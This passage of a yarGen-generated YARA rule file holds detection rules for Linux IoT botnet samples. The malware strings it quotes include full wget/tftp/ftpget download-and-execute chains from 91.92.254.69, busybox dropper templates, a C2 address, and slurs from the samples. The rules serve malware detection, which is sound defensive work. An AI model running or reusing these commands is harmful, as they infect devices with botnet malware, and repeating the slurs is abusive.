      $op2 = { 24 ee 40 00 d4 f3 41 00 10 f0 41 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_97 {
   meta:
      description = "Linux_97"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "3042f63761941a681e2e51ac165131ec65e55f5c79446d3585a5c6105b58cc04"
   strings:
      $s1 = "__stdio_mutex_initializer.3812" fullword ascii
      $s2 = "/home/firmware/build/temp-sh4/gcc-core/gcc/config/sh/lib1funcs.asm" fullword ascii
      $s3 = "completed.2217" fullword ascii
      $s4 = "spec_chars.4025" fullword ascii
      $s5 = "L_uClibc_main" fullword ascii
      $s6 = "Pccg7x3" fullword ascii
      $s7 = "been_there_done_that.2753" fullword ascii
      $s8 = "spec_flags.4024" fullword ascii
      $s9 = "next_start.1030" fullword ascii
      $s10 = "__init_brk" fullword ascii
      $s11 = "xdigits.3026" fullword ascii
      $s12 = "object.2270" fullword ascii
      $s13 = "unknown.1072" fullword ascii
      $s14 = "spec_ranges.4026" fullword ascii
      $s15 = "spec_or_mask.4027" fullword ascii
      $s16 = "__sdivsi3_i4" fullword ascii
      $s17 = "libc/string/sh/sh4/memcpy.S" fullword ascii
      $s18 = "libc/sysdeps/linux/sh/crt1.S" fullword ascii
      $s19 = "__udivsi3_i4" fullword ascii
      $s20 = "__init_brk.c" fullword ascii

      $op0 = { ff 00 34 d3 40 00 03 d5 04 d1 e6 2f f3 6e e3 6f }
      $op1 = { d6 03 00 00 c2 06 00 00 06 08 00 00 46 09 00 00 }
      $op2 = { 01 00 dc ff 00 00 40 42 0f 00 00 e1 12 1e e3 61 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_98 {
   meta:
      description = "Linux_98"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "aa28b6d17857a03646708f6c8d75b69cae71fde812219d66f10234d4b0f0e0af"
   strings:
      $s1 = "__stdio_mutex_initializer.3812" fullword ascii
      $s2 = "/home/firmware/build/temp-sh4/gcc-core/gcc/config/sh/lib1funcs.asm" fullword ascii
      $s3 = "completed.2217" fullword ascii
      $s4 = "spec_chars.4025" fullword ascii
      $s5 = "L_uClibc_main" fullword ascii
      $s6 = "Pccg7x3" fullword ascii
      $s7 = "been_there_done_that.2753" fullword ascii
      $s8 = "spec_flags.4024" fullword ascii
      $s9 = "next_start.1030" fullword ascii
      $s10 = "__init_brk" fullword ascii
      $s11 = "xdigits.3026" fullword ascii
      $s12 = "object.2270" fullword ascii
      $s13 = "unknown.1072" fullword ascii
      $s14 = "spec_ranges.4026" fullword ascii
      $s15 = "spec_or_mask.4027" fullword ascii
      $s16 = "__sdivsi3_i4" fullword ascii
      $s17 = "libc/string/sh/sh4/memcpy.S" fullword ascii
      $s18 = "libc/sysdeps/linux/sh/crt1.S" fullword ascii
      $s19 = "__udivsi3_i4" fullword ascii
      $s20 = "__init_brk.c" fullword ascii

      $op0 = { e6 2f 68 26 62 15 71 15 03 8d f3 6e 51 16 02 a0 }
      $op1 = { 17 93 10 c3 03 61 f4 e2 2c 41 17 61 18 21 0c 8b }
      $op2 = { 86 2f 48 24 96 2f 43 69 a6 2f 63 6a b6 2f 53 6b }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_99 {
   meta:
      description = "Linux_99"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "3c521d6db959df9f9ebc3dea91ec2fe68e6f5dd6865ca53c1db77ce845fe86f5"
   strings:
      $s1 = "__stdio_mutex_initializer.4280" fullword ascii
      $s2 = "[0;97m ] Connected -> " fullword ascii
      $s3 = "Nigger Bruted -> %s [ %s:%s ]" fullword ascii
      $s4 = "getrlimit64" fullword ascii
      $s5 = "completed.2761" fullword ascii
      $s6 = "AWAVAUI" fullword ascii
      $s7 = "AVAUATU" fullword ascii
      $s8 = "AVAUATS" fullword ascii
      $s9 = "AUATUSH" fullword ascii
      $s10 = "AWAVAUATUL" fullword ascii
      $s11 = "94.156.64.143:9821" fullword ascii
      $s12 = "[0;97m| Device: " fullword ascii
      $s13 = "[0;97m  | Endian " fullword ascii
      $s14 = "gayass.c" fullword ascii
      $s15 = "ay2fzc1txz22mldwtj4ipcevw5q8zq6" fullword ascii
      $s16 = "[0;91mNigger " fullword ascii
      $s17 = "libc/string/x86_64/strpbrk.S" fullword ascii
      $s18 = "object.2814" fullword ascii
      $s19 = "__GI___libc_lseek" fullword ascii
      $s20 = "libc/sysdeps/linux/x86_64/crtn.S" fullword ascii

      $op0 = { eb 0c 48 63 c2 48 c7 44 c4 08 ff ff ff ff ff ca }
      $op1 = { eb 38 b8 00 04 00 00 eb 31 b8 ff ff ff 7f eb 2a }
      $op2 = { e8 49 fd ff ff ff 45 cc ff 4d d8 eb 0b 48 ff 4d }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_100 {
   meta:
      description = "Linux_100"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "7bf1ba4c5536f27ba7c4c317bb8003ab6f65354f1890fd24728ed2f467ee1495"
   strings:
      $s1 = "__stdio_mutex_initializer.3833" fullword ascii
      $s2 = "[0;97m ] Connected -> " fullword ascii
      $s3 = "Nigger Bruted -> %s [ %s:%s ]" fullword ascii
      $s4 = "<x%s %s HTTP/1.1" fullword ascii
      $s5 = "completed.2296" fullword ascii
      $s6 = "94.156.64.143:9821" fullword ascii
      $s7 = "[0;97m| Device: " fullword ascii
      $s8 = "[0;97m  | Endian " fullword ascii
      $s9 = "gayass.c" fullword ascii
      $s10 = "ay2fzc1txz22mldwtj4ipcevw5q8zq6" fullword ascii
      $s11 = "[0;91mNigger " fullword ascii
      $s12 = "object.2349" fullword ascii
      $s13 = "libc/sysdeps/linux/mips/crtn.S" fullword ascii
      $s14 = "libc/string/mips/memcpy.S" fullword ascii
      $s15 = "libc/sysdeps/linux/mips/crti.S" fullword ascii
      $s16 = "been_there_done_that.2792" fullword ascii
      $s17 = "libc/string/mips/memset.S" fullword ascii
      $s18 = "libc/sysdeps/linux/mips/crt1.S" fullword ascii
      $s19 = "next_start.1065" fullword ascii
      $s20 = "qual_chars.4050" fullword ascii

      $op0 = { 10 00 00 03 34 42 00 04 34 42 00 08 00 00 18 21 }
      $op1 = { 18 21 34 42 00 01 a6 02 00 00 8f bf 00 1c 8f b0 }
      $op2 = { 02 e2 10 2a 10 40 00 03 02 34 10 2a 14 40 ff 95 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_101 {
   meta:
      description = "Linux_101"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "c2bc677627dc1c48507e5773d83e3ad7e5e315a2d3011c07fda8fea96f626998"
   strings:
      $s1 = "__stdio_mutex_initializer.3929" fullword ascii
      $s2 = "[0;97m ] Connected -> " fullword ascii
      $s3 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s4 = "Nigger Bruted -> %s [ %s:%s ]" fullword ascii
      $s5 = "/home/firmware/build/temp-armv4l/build-gcc/gcc" fullword ascii
      $s6 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s7 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm" fullword ascii
      $s8 = ".//////////////22///" fullword ascii /* hex encoded string '"' */
      $s9 = ".///3/2///////////////////0//0////" fullword ascii /* hex encoded string '2' */
      $s10 = "completed.2555" fullword ascii
      $s11 = "94.156.64.143:9821" fullword ascii
      $s12 = "[0;97m| Device: " fullword ascii
      $s13 = "[0;97m  | Endian " fullword ascii
      $s14 = "gayass.c" fullword ascii
      $s15 = "ay2fzc1txz22mldwtj4ipcevw5q8zq6" fullword ascii
      $s16 = "[0;91mNigger " fullword ascii
      $s17 = "spec_or_mask.4145" fullword ascii
      $s18 = "been_there_done_that.2789" fullword ascii
      $s19 = "prefix.4141" fullword ascii
      $s20 = "qual_chars.4147" fullword ascii

      $op0 = { 20 a0 e1 ff 38 00 e2 ff 0c 00 e2 23 34 a0 e1 00 }
      $op1 = { be 00 90 ef 01 0a 70 e3 0e f0 a0 31 25 10 e0 e3 }
      $op2 = { 0a 47 00 00 ea 00 30 a0 e3 28 30 0b e5 46 00 00 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_102 {
   meta:
      description = "Linux_102"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0571c16d0f2d0267b354f81fdbfb49738f3cb867371b9ef0d3ffe1020fb9f9cf"
   strings:
      $s1 = "hoste.6387" fullword ascii
      $s2 = "__lll_unlock_wake_private" fullword ascii
      $s3 = "completed.4720" fullword ascii
      $s4 = "u/etc/hosts" fullword ascii
      $s5 = "rVsScQp1" fullword ascii
      $s6 = "Pcbg382" fullword ascii
      $s7 = "L_uClibc_main" fullword ascii
      $s8 = "__init_brk" fullword ascii
      $s9 = "__init_brk.c" fullword ascii
      $s10 = "__movmemSI12_i4" fullword ascii
      $s11 = "resolv_conf_mtime.6430" fullword ascii
      $s12 = "I8txWx'sdsc@t" fullword ascii
      $s13 = "wraCc@s" fullword ascii
      $s14 = "xdigits.5851" fullword ascii
      $s15 = "nRRSl8#" fullword ascii
      $s16 = "L_movmem_start_even" fullword ascii
      $s17 = "L_movmem_loop" fullword ascii
      $s18 = "__GI___waitpid" fullword ascii
      $s19 = "__sigsetjmp_intern" fullword ascii
      $s20 = "__sdivsi3_i4i" fullword ascii

      $op0 = { 22 21 da af 83 63 fc 00 00 f0 09 00 34 d6 01 00 }
      $op1 = { 80 b0 0d 03 00 ff ff ff 7f 0f d1 43 63 0f d2 00 }
      $op2 = { 03 61 f4 e2 2c 41 17 61 18 21 2f 89 34 a0 09 00 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_103 {
   meta:
      description = "Linux_103"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b73ddb2fdd0bfa04b2f14aea926418f29e479204d9e10ef97755829756e58411"
   strings:
      $s1 = "Unable To Connect to Target: %s:%d " fullword ascii
      $s2 = "Connected To Target: %s:%d " fullword ascii
      $s3 = "get_cmdline" fullword ascii
      $s4 = "commandparsing" fullword ascii
      $s5 = "cmdlinekillstrings" fullword ascii
      $s6 = "decodedshit" fullword ascii
      $s7 = "connecthosts" fullword ascii
      $s8 = "killer_cmdlinelol" fullword ascii
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2" fullword ascii
      $s10 = "cmdparse" fullword ascii
      $s11 = "pathread" fullword ascii
      $s12 = "remoteaddr" fullword ascii
      $s13 = "Sending requests to: %s:%d " fullword ascii
      $s14 = "Device Connected [Name:%s] [Arch:%s] [UID:%d]" fullword ascii
      $s15 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s16 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s17 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5" fullword ascii
      $s18 = "attackpids" fullword ascii
      $s19 = "whitlistpaths" fullword ascii
      $s20 = "estring" fullword ascii

      $op0 = { 80 b0 0d 03 00 ff ff ff 7f 0f d1 43 63 0f d2 00 }
      $op1 = { 03 61 f4 e2 2c 41 17 61 18 21 2f 89 34 a0 09 00 }
      $op2 = { 09 e1 12 22 34 a0 ff e0 1f d1 43 68 18 78 e3 64 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_104 {
   meta:
      description = "Linux_104"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "34f2116c9eeb4c61283f35111066bd000c78ab2194181cd27d5189f75f477824"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s3 = "tpget -v -u anonymous -p anonymous -P 21 91.92.254.69 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm " ascii
      $s4 = "92.254.69 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 91.92.254.69; chmod 777 tftp2.sh; sh tftp2.sh; f" ascii
      $s5 = "wget --no-check-certificate -q -O /tmp/null " fullword ascii
      $s6 = "REPORT %s:%s:%s" fullword ascii
      $s7 = "__stdio_mutex_initializer.3929" fullword ascii
      $s8 = "/home/firmware/build/temp-armv5l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s9 = "infectline" fullword ascii
      $s10 = "getRandomPublicIP" fullword ascii
      $s11 = "/home/firmware/build/temp-armv5l/gcc-core/gcc/config/arm" fullword ascii
      $s12 = "/home/firmware/build/temp-armv5l/build-gcc/gcc" fullword ascii
      $s13 = "GETLOCALIP" fullword ascii
      $s14 = "PROBING" fullword ascii
      $s15 = "getBogos" fullword ascii
      $s16 = "getCores" fullword ascii
      $s17 = "/usr/sbin/dropbear" fullword ascii
      $s18 = "zprintf" fullword ascii
      $s19 = "hextable" fullword ascii
      $s20 = "fdpclose" fullword ascii

      $op0 = { 20 a0 e1 ff 38 00 e2 ff 0c 00 e2 23 34 a0 e1 00 }
      $op1 = { 5c e3 08 e0 8d e2 18 60 8e d2 03 00 00 da 24 c0 }
      $op2 = { 70 40 2d e9 00 40 51 e2 46 df 4d e2 00 60 a0 e1 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_105 {
   meta:
      description = "Linux_105"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "84142d05fb499adc506234050d0a8f0b150bda41e1f074c379a74cbbe01df6f7"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s3 = "tpget -v -u anonymous -p anonymous -P 21 91.92.254.69 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm " ascii
      $s4 = "92.254.69 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 91.92.254.69; chmod 777 tftp2.sh; sh tftp2.sh; f" ascii
      $s5 = "wget --no-check-certificate -q -O /tmp/null " fullword ascii
      $s6 = "REPORT %s:%s:%s" fullword ascii
      $s7 = "__stdio_mutex_initializer.3833" fullword ascii
      $s8 = "infectline" fullword ascii
      $s9 = "getRandomPublicIP" fullword ascii
      $s10 = "GETLOCALIP" fullword ascii
      $s11 = "libc/sysdeps/linux/mips/pipe.S" fullword ascii
      $s12 = "PROBING" fullword ascii
      $s13 = "getBogos" fullword ascii
      $s14 = "getCores" fullword ascii
      $s15 = "/usr/sbin/dropbear" fullword ascii
      $s16 = "zprintf" fullword ascii
      $s17 = "hextable" fullword ascii
      $s18 = "fdpclose" fullword ascii
      $s19 = "fdpopen" fullword ascii
      $s20 = "__GI_pipe" fullword ascii

      $op0 = { 03 c0 e8 21 8f bf 00 34 8f be 00 30 27 bd 00 38 }
      $op1 = { 24 42 00 01 af c2 00 34 8f c2 00 34 }
      $op2 = { 8f c3 00 34 8f c2 00 30 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_106 {
   meta:
      description = "Linux_106"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "ed6e70a9b90ff6aba55e45d0c48f319d85b1b13d7813219d91fcbc59461298db"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s3 = "tpget -v -u anonymous -p anonymous -P 21 91.92.254.69 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm " ascii
      $s4 = "92.254.69 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 91.92.254.69; chmod 777 tftp2.sh; sh tftp2.sh; f" ascii
      $s5 = "wget --no-check-certificate -q -O /tmp/null " fullword ascii
      $s6 = "REPORT %s:%s:%s" fullword ascii
      $s7 = "__stdio_mutex_initializer.4636" fullword ascii
      $s8 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s9 = "infectline" fullword ascii
      $s10 = "getRandomPublicIP" fullword ascii
      $s11 = "/home/landley/work/ab7/build/temp-armv6l/build-gcc/gcc" fullword ascii
      $s12 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm" fullword ascii
      $s13 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s14 = "GETLOCALIP" fullword ascii
      $s15 = "PROBING" fullword ascii
      $s16 = "getBogos" fullword ascii
      $s17 = "getCores" fullword ascii
      $s18 = "/usr/sbin/dropbear" fullword ascii
      $s19 = "zprintf" fullword ascii
      $s20 = "hextable" fullword ascii

      $op0 = { f0 45 2d e9 34 30 92 e5 98 50 9f e5 01 a0 73 e2 }
      $op1 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f 00 00 0d }
      $op2 = { 0a f5 00 00 ea 34 40 1b e5 02 00 a0 e3 01 10 a0 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_107 {
   meta:
      description = "Linux_107"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f801e79b6a7fde132fd8c2e78b42f2cd0172c1fc80168cdea920cf1620098f8b"
   strings:
      $x1 = " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91" ascii
      $s2 = " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91" ascii
      $s3 = "ftpget -v -u anonymous -p anonymous -P 21 91.92.254.69 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm" ascii
      $s4 = ".92.254.69 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 91.92.254.69; chmod 777 tftp2.sh; sh tftp2.sh; " ascii
      $s5 = "wget --no-check-certificate -q -O /tmp/null " fullword ascii
      $s6 = "REPORT %s:%s:%s" fullword ascii
      $s7 = "__stdio_mutex_initializer.3862" fullword ascii
      $s8 = "infectline" fullword ascii
      $s9 = "getRandomPublicIP" fullword ascii
      $s10 = "GETLOCALIP" fullword ascii
      $s11 = "PROBING" fullword ascii
      $s12 = "getBogos" fullword ascii
      $s13 = "getCores" fullword ascii
      $s14 = "/usr/sbin/dropbear" fullword ascii
      $s15 = "zprintf" fullword ascii
      $s16 = "hextable" fullword ascii
      $s17 = "fdpclose" fullword ascii
      $s18 = "fdpopen" fullword ascii
      $s19 = "__GI_pipe" fullword ascii
      $s20 = "sendHTTP" fullword ascii

      $op0 = { 94 21 ff f0 7c 08 02 a6 93 c1 00 08 3f c0 10 02 }
      $op1 = { 91 3f 00 14 91 3f 00 18 91 3f 00 1c 91 3f 00 10 }
      $op2 = { 7f a3 eb 78 90 01 00 0c 91 21 00 98 48 00 09 51 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_108 {
   meta:
      description = "Linux_108"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "1b5c89cdb820f93030e2dd5161cfccdaf7c6be9e92fbf5ff6e0591ae5e3e824e"
   strings:
      $s1 = "__stdio_mutex_initializer.3929" fullword ascii
      $s2 = "/home/firmware/build/temp-armv5l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s3 = "/home/firmware/build/temp-armv5l/gcc-core/gcc/config/arm" fullword ascii
      $s4 = "/home/firmware/build/temp-armv5l/build-gcc/gcc" fullword ascii
      $s5 = "completed.2555" fullword ascii
      $s6 = "spec_or_mask.4145" fullword ascii
      $s7 = "been_there_done_that.2789" fullword ascii
      $s8 = "prefix.4141" fullword ascii
      $s9 = "qual_chars.4147" fullword ascii
      $s10 = "object.2636" fullword ascii
      $s11 = "next_start.1066" fullword ascii
      $s12 = "libc/sysdeps/linux/arm/vfork.S" fullword ascii
      $s13 = "spec_flags.4142" fullword ascii
      $s14 = "spec_and_mask.4146" fullword ascii
      $s15 = "spec_ranges.4144" fullword ascii
      $s16 = "force_to_data" fullword ascii
      $s17 = "spec_base.4140" fullword ascii
      $s18 = "spec_chars.4143" fullword ascii
      $s19 = "libc/string/arm/memmove.S" fullword ascii
      $s20 = "libc/string/arm/bcopy.S" fullword ascii

      $op0 = { 20 a0 e1 ff 38 00 e2 ff 0c 00 e2 23 34 a0 e1 00 }
      $op1 = { be 00 90 ef 01 0a 70 e3 0e f0 a0 31 25 10 e0 e3 }
      $op2 = { 5c e3 08 e0 8d e2 18 60 8e d2 03 00 00 da 24 c0 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_109 {
   meta:
      description = "Linux_109"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "63b923e770d615a55eef3e624436ffcddb4b074ad37eb0673649d6485192f9b4"
   strings:
      $s1 = "__stdio_mutex_initializer.3929" fullword ascii
      $s2 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s3 = "/home/firmware/build/temp-armv4l/build-gcc/gcc" fullword ascii
      $s4 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s5 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm" fullword ascii
      $s6 = ".//////////////22///" fullword ascii /* hex encoded string '"' */
      $s7 = ".///3/2///////////////////0//0////" fullword ascii /* hex encoded string '2' */
      $s8 = "completed.2555" fullword ascii
      $s9 = "spec_or_mask.4145" fullword ascii
      $s10 = "been_there_done_that.2789" fullword ascii
      $s11 = "prefix.4141" fullword ascii
      $s12 = "qual_chars.4147" fullword ascii
      $s13 = "object.2636" fullword ascii
      $s14 = "next_start.1066" fullword ascii
      $s15 = "libc/sysdeps/linux/arm/vfork.S" fullword ascii
      $s16 = "spec_flags.4142" fullword ascii
      $s17 = "spec_and_mask.4146" fullword ascii
      $s18 = "spec_ranges.4144" fullword ascii
      $s19 = "force_to_data" fullword ascii
      $s20 = "spec_base.4140" fullword ascii

      $op0 = { 20 a0 e1 ff 38 00 e2 ff 0c 00 e2 23 34 a0 e1 00 }
      $op1 = { be 00 90 ef 01 0a 70 e3 0e f0 a0 31 25 10 e0 e3 }
      $op2 = { 0a 47 00 00 ea 00 30 a0 e3 28 30 0b e5 46 00 00 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_110 {
   meta:
      description = "Linux_110"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "8cab98d426860fdb38a77e074bf3a313aa6fca0422077a00cf9668d8a7120e6f"
   strings:
      $s1 = "__stdio_mutex_initializer.3929" fullword ascii
      $s2 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s3 = "/home/firmware/build/temp-armv4l/build-gcc/gcc" fullword ascii
      $s4 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s5 = "/home/firmware/build/temp-armv4l/gcc-core/gcc/config/arm" fullword ascii
      $s6 = ".//////////////22///" fullword ascii /* hex encoded string '"' */
      $s7 = ".///3/2///////////////////0//0////" fullword ascii /* hex encoded string '2' */
      $s8 = "completed.2555" fullword ascii
      $s9 = "spec_or_mask.4145" fullword ascii
      $s10 = "been_there_done_that.2789" fullword ascii
      $s11 = "prefix.4141" fullword ascii
      $s12 = "qual_chars.4147" fullword ascii
      $s13 = "object.2636" fullword ascii
      $s14 = "next_start.1066" fullword ascii
      $s15 = "libc/sysdeps/linux/arm/vfork.S" fullword ascii
      $s16 = "spec_flags.4142" fullword ascii
      $s17 = "spec_and_mask.4146" fullword ascii
      $s18 = "spec_ranges.4144" fullword ascii
      $s19 = "force_to_data" fullword ascii
      $s20 = "spec_base.4140" fullword ascii

      $op0 = { 20 a0 e1 ff 38 00 e2 ff 0c 00 e2 23 34 a0 e1 00 }
      $op1 = { 50 e3 f0 41 2d e9 f0 81 bd 08 04 50 10 e5 c0 80 }
      $op2 = { 8a 00 70 a0 e3 07 00 a0 e1 f0 80 bd e8 30 40 2d }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_111 {
   meta:
      description = "Linux_111"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "bdda2f54c9e7ea759e1be9bbd25892563f229a3204df6d8291e6ff81c4d557a8"
   strings:
      $s1 = "__stdio_mutex_initializer.3929" fullword ascii
      $s2 = "/home/firmware/build/temp-armv5l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s3 = "/home/firmware/build/temp-armv5l/gcc-core/gcc/config/arm" fullword ascii
      $s4 = "/home/firmware/build/temp-armv5l/build-gcc/gcc" fullword ascii
      $s5 = "completed.2555" fullword ascii
      $s6 = "spec_or_mask.4145" fullword ascii
      $s7 = "been_there_done_that.2789" fullword ascii
      $s8 = "prefix.4141" fullword ascii
      $s9 = "qual_chars.4147" fullword ascii
      $s10 = "object.2636" fullword ascii
      $s11 = "next_start.1066" fullword ascii
      $s12 = "libc/sysdeps/linux/arm/vfork.S" fullword ascii
      $s13 = "spec_flags.4142" fullword ascii
      $s14 = "spec_and_mask.4146" fullword ascii
      $s15 = "spec_ranges.4144" fullword ascii
      $s16 = "force_to_data" fullword ascii
      $s17 = "spec_base.4140" fullword ascii
      $s18 = "spec_chars.4143" fullword ascii
      $s19 = "libc/string/arm/memmove.S" fullword ascii
      $s20 = "libc/string/arm/bcopy.S" fullword ascii

      $op0 = { 20 a0 e1 ff 38 00 e2 ff 0c 00 e2 23 34 a0 e1 00 }
      $op1 = { 5c e3 08 e0 8d e2 18 60 8e d2 03 00 00 da 24 c0 }
      $op2 = { 50 e3 f0 41 2d e9 f0 81 bd 08 04 50 10 e5 c0 80 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_112 {
   meta:
      description = "Linux_112"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "bb2c20e994ddd2c9c459b0a7558e61736a89b23afe3d20dac931567c0c7cc699"
   strings:
      $s1 = "tftp -r %s%s -g %s && chmod 777 %s%s && ./%s%s telnet.%s; %s" fullword ascii
      $s2 = "/bin/busybox wget http://%s/%s%s -O doomsbin && chmod 777 doomsbin && ./doomsbin telnet.%s && %s" fullword ascii
      $s3 = "busybox wget http://%s/%s%s -O doomsbin && chmod 777 doomsbin && ./doomsbin telnet.%s && %s" fullword ascii
      $s4 = "wget http://%s/%s%s -O doomsbin && chmod 777 doomsbin && ./doomsbin telnet.%s && %s" fullword ascii
      $s5 = "host login:" fullword ascii
      $s6 = "LocalHost login" fullword ascii
